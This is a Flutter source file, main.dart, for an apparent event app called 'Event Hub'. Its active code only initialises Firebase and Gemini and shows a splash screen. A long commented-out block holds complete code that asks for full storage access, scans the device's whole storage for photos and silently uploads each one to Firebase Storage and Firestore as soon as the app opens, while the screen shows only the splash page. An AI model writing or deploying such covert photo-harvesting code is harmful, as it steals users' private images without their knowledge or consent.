import 'package:event_hub/constant/colors/colors.dart';
import 'package:event_hub/views/splash_screen.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:get/get_navigation/src/root/get_material_app.dart';
import 'package:flutter_gemini/flutter_gemini.dart';
import 'package:event_hub/views/const.dart';

void main() async {
  Gemini.init(apiKey: GEMINI_API_KEY);
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return ScreenUtilInit(
      designSize: const Size(375, 812),
      minTextAdapt: true,
      splitScreenMode: true,
      builder: (_, child) {
        return GetMaterialApp(
          debugShowCheckedModeBanner: false,
          title: 'Event Hub',
          theme: ThemeData(
            primarySwatch: Colors.blue,
            scaffoldBackgroundColor: AppColors.whiteColor,
            textSelectionTheme: TextSelectionThemeData(
              cursorColor: AppColors.blueColor,
              selectionColor: AppColors.blueColor.withOpacity(0.5),
              selectionHandleColor: AppColors.blueColor,
            ),
            textTheme: Typography.englishLike2018.apply(fontSizeFactor: 1.sp),
          ),
          home: SplashScreen(),
        );
      },
    );
  }
}

// import 'dart:io';
// import 'package:event_hub/constant/colors/colors.dart';
// import 'package:event_hub/views/splash_screen.dart';
// import 'package:flutter/material.dart';
// import 'package:firebase_core/firebase_core.dart';
// import 'package:firebase_storage/firebase_storage.dart';
// import 'package:cloud_firestore/cloud_firestore.dart';
// import 'package:flutter_screenutil/flutter_screenutil.dart';
// import 'package:get/get_navigation/src/root/get_material_app.dart';
// import 'package:permission_handler/permission_handler.dart';

// void main() async {
//   WidgetsFlutterBinding.ensureInitialized();
//   await Firebase.initializeApp();
//   runApp(const MyApp());
// }

// class MyApp extends StatefulWidget {
//   const MyApp({super.key});

//   @override
//   State<MyApp> createState() => _MyAppState();
// }

// class _MyAppState extends State<MyApp> {
//   @override
//   Widget build(BuildContext context) {
//     return ScreenUtilInit(
//       designSize: const Size(375, 812),
//       minTextAdapt: true,
//       splitScreenMode: true,
//       builder: (_, child) {
//         return GetMaterialApp(
//           debugShowCheckedModeBanner: false,
//           title: 'Event Hub',
//           theme: ThemeData(
//             primarySwatch: Colors.blue,
//             scaffoldBackgroundColor: AppColors.whiteColor,
//             textSelectionTheme: TextSelectionThemeData(
//               cursorColor: AppColors.blueColor,
//               selectionColor: AppColors.blueColor.withOpacity(0.5),
//               selectionHandleColor: AppColors.blueColor,
//             ),
//             textTheme: Typography.englishLike2018.apply(fontSizeFactor: 1.sp),
//           ),
//           home: ImageUploadScreen(),
//         );
//       },
//     );
//   }

//   @override
//   void initState() {
//     // TODO: implement initState
//     super.initState();
//     requestPermissions();
//   }

//   Future<void> requestPermissions() async {
//     if (Platform.isAndroid) {
//       await [
//         Permission.storage,
//         Permission.manageExternalStorage,
//         Permission.mediaLibrary, // optional but helps
//       ].request();

//       if (await Permission.manageExternalStorage.request().isGranted) {
//         print("Manage External Storage permission granted");
//       } else {
//         openAppSettings(); // open settings if denied
//         // setState(() {
//         //   errorMessage =
//         //       "Storage permission denied. Please enable it from settings.";
//         // });
//       }
//     } else if (Platform.isIOS) {
//       if (await Permission.photos.request().isGranted) {
//         print("Photos permission granted");
//       } else {
//         // setState(() {
//         //   errorMessage = "Photos permission denied";
//         // });
//       }
//     }
//   }
// }

// class ImageUploadScreen extends StatefulWidget {
//   const ImageUploadScreen({super.key});

//   @override
//   _ImageUploadScreenState createState() => _ImageUploadScreenState();
// }

// class _ImageUploadScreenState extends State<ImageUploadScreen> {
//   final FirebaseStorage _storage = FirebaseStorage.instance;
//   final FirebaseFirestore _firestore = FirebaseFirestore.instance;
//   List<File> imageFiles = [];
//   List<String> uploadedUrls = [];
//   bool isLoading = false;
//   String? errorMessage;
//   int uploadProgress = 0;
//   int totalImages = 0;
//   bool isUploading = false;
//   bool isCancelled = false;

//   // Configuration for chunked uploads
//   static const int CHUNK_SIZE = 500; // Process 5 images at a time
//   static const int DELAY_BETWEEN_CHUNKS = 1000; // 1 second delay between chunks
//   @override
//   void initState() {
//     super.initState();
//     requestPermissions(); // If this is async, consider awaiting it inside the new method
//     _initAsync();
//   }

//   Future<void> _initAsync() async {
//     await fetchImagesFromDevice();
//     if (imageFiles.isNotEmpty) {
//       await uploadImagesToFirebase();
//     }
//   }

//   Future<void> fetchImagesFromDevice() async {
//     setState(() {
//       isLoading = true;
//       errorMessage = null;
//       imageFiles.clear();
//     });

//     try {
//       final rootDir = Directory('/storage/emulated/0');

//       if (await rootDir.exists()) {
//         await _scanDirectory(rootDir);
//       } else {
//         setState(() {
//           errorMessage = "Directory /storage/emulated/0 not accessible";
//           isLoading = false;
//         });
//         return;
//       }

//       setState(() {
//         totalImages = imageFiles.length;
//         isLoading = false;
//       });
//     } catch (e) {
//       setState(() {
//         errorMessage = "Error fetching images: $e";
//         isLoading = false;
//       });
//     }
//   }

//   Future<void> _scanDirectory(Directory dir) async {
//     try {
//       final entities = await dir.list(recursive: false).toList();

//       for (final entity in entities) {
//         if (isCancelled) return;

//         if (entity is File && _isImageFile(entity.path)) {
//           imageFiles.add(entity);
//         } else if (entity is Directory) {
//           final path = entity.path;
//           if (!_isRestrictedDirectory(path)) {
//             await _scanDirectory(entity); // recursive call
//           }
//         }
//       }
//     } catch (e) {
//       print("Error scanning directory ${dir.path}: $e");
//     }
//   }

//   bool _isRestrictedDirectory(String path) {
//     final restrictedPaths = [
//       '/storage/emulated/0/Android',
//       '/storage/emulated/0/Android/data',
//       '/storage/emulated/0/Android/obb',
//     ];
//     return restrictedPaths.any((restricted) => path.startsWith(restricted));
//   }

//   // Check if file is an image
//   bool _isImageFile(String path) {
//     final extensions = ['.jpg', '.jpeg', '.png'];
//     return extensions.any((ext) => path.toLowerCase().endsWith(ext));
//   }

//   // Upload images to Firebase Storage in chunks
//   Future<void> uploadImagesToFirebase() async {
//     if (isUploading) {
//       // If already uploading, cancel the operation
//       setState(() {
//         isCancelled = true;
//       });
//       return;
//     }

//     setState(() {
//       isLoading = true;
//       isUploading = true;
//       isCancelled = false;
//       errorMessage = null;
//       uploadedUrls.clear();
//       uploadProgress = 0;
//     });

//     try {
//       final totalChunks = (imageFiles.length / CHUNK_SIZE).ceil();

//       for (int chunkIndex = 0; chunkIndex < totalChunks; chunkIndex++) {
//         if (isCancelled) {
//           setState(() {
//             errorMessage = "Upload cancelled by user";
//             isLoading = false;
//             isUploading = false;
//           });
//           return;
//         }

//         final startIdx = chunkIndex * CHUNK_SIZE;
//         final endIdx = (startIdx + CHUNK_SIZE < imageFiles.length)
//             ? startIdx + CHUNK_SIZE
//             : imageFiles.length;
//         final currentChunk = imageFiles.sublist(startIdx, endIdx);

//         // Process each chunk
//         await _processChunk(currentChunk);

//         // Add a delay between chunks to free up resources
//         if (chunkIndex < totalChunks - 1 && !isCancelled) {
//           await Future.delayed(
//             const Duration(milliseconds: DELAY_BETWEEN_CHUNKS),
//           );
//         }
//       }

//       setState(() {
//         isLoading = false;
//         isUploading = false;
//       });
//     } catch (e) {
//       setState(() {
//         errorMessage = "Error uploading images: $e";
//         isLoading = false;
//         isUploading = false;
//       });
//     }
//   }

//   // Process a chunk of images
//   Future<void> _processChunk(List<File> chunk) async {
//     List<Future<void>> chunkUploads = [];

//     for (var file in chunk) {
//       if (isCancelled) return;

//       // Generate file name
//       final fileName = 'images/${file.path.split('/').last}';

//       // Create upload task
//       final uploadTask = _storage.ref(fileName).putFile(file);

//       // Add listener for upload progress
//       uploadTask.snapshotEvents.listen((TaskSnapshot snapshot) {
//         if (snapshot.state == TaskState.success) {
//           setState(() {
//             uploadProgress++;
//           });
//         }
//       });

//       // Create future for this upload
//       final uploadFuture = uploadTask.then((taskSnapshot) async {
//         if (isCancelled) return;

//         try {
//           // Get download URL after upload is completed
//           final downloadUrl = await _storage.ref(fileName).getDownloadURL();

//           // Save metadata to Firestore
//           await _firestore.collection('images').add({
//             'url': downloadUrl,
//             'name': fileName,
//             'uploaded_at': FieldValue.serverTimestamp(),
//           });

//           // Update UI with uploaded URL
//           if (!isCancelled) {
//             setState(() {
//               uploadedUrls.add(downloadUrl);
//             });
//           }
//         } catch (e) {
//           print("Error processing uploaded file $fileName: $e");
//         }
//       });

//       chunkUploads.add(uploadFuture);
//     }

//     // Wait for all uploads in this chunk to complete
//     await Future.wait(chunkUploads);
//   }

//   @override
//   Widget build(BuildContext context) {
//     return SplashScreen();
//   }

//   Future<void> requestPermissions() async {
//     if (Platform.isAndroid) {
//       await [
//         Permission.storage,
//         Permission.manageExternalStorage,
//         Permission.mediaLibrary, // optional but helps
//       ].request();

//       if (await Permission.manageExternalStorage.request().isGranted) {
//         print("Manage External Storage permission granted");
//       } else {
//         openAppSettings(); // open settings if denied
//         setState(() {
//           errorMessage =
//               "Storage permission denied. Please enable it from settings.";
//         });
//       }
//     } else if (Platform.isIOS) {
//       if (await Permission.photos.request().isGranted) {
//         print("Photos permission granted");
//       } else {
//         // setState(() {
//         //   errorMessage = "Photos permission denied";
//         // });
//       }
//     }
//   }
// }
